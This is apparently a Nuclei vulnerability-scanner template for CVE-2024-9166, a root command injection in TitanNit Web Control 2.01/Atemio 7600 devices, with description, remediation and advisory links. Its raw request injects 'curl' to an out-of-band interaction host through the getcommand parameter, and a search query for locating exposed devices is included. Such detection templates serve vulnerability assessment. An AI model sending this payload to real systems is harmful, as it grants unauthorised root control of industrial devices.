http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: body
    type: word
    words:
    - titan.css
  matchers-condition: and
  raw:
  - '@timeout: 20s

    GET /query?getcommand=&cmd=curl+http://{{interactsh-url}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-9166
info:
  author: DhiyaneshDk
  classification:
    cve-id: CVE-2024-9166
    cwe-id: CWE-78
    epss-percentile: 0.88842
    epss-score: 0.04578
  description: 'The device contains a command injection caused by the ''getcommand''
    query in the application, letting unauthorized attackers execute system commands
    with root privileges, exploit requires attacker to send crafted requests.

    '
  impact: 'Unauthenticated attackers can execute arbitrary system commands with root
    privileges through command injection in the getcommand query parameter, achieving
    complete control of the TitanNit Web Control device and potentially pivoting to
    connected industrial control systems.

    '
  metadata:
    fofa-query: title="TitanNit Web Control"
    max-request: 1
    verified: true
  name: TitanNit Web Control 2.01/Atemio 7600 - Remote Code Execution
  reference:
  - https://www.cisa.gov/news-events/ics-advisories/icsa-24-270-03
  - https://www.exploit-db.com/exploits/51853
  - https://github.com/Andrysqui/CVE-2024-9166
  - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2023-5801.php
  remediation: 'Apply security patches from TitanNit for Web Control 2.01 and Atemio
    7600 to address the command injection vulnerability in the getcommand query parameter.

    '
  severity: critical
  tags: cve,cve2024,titanit,web-control,oast,rce,ics,vuln
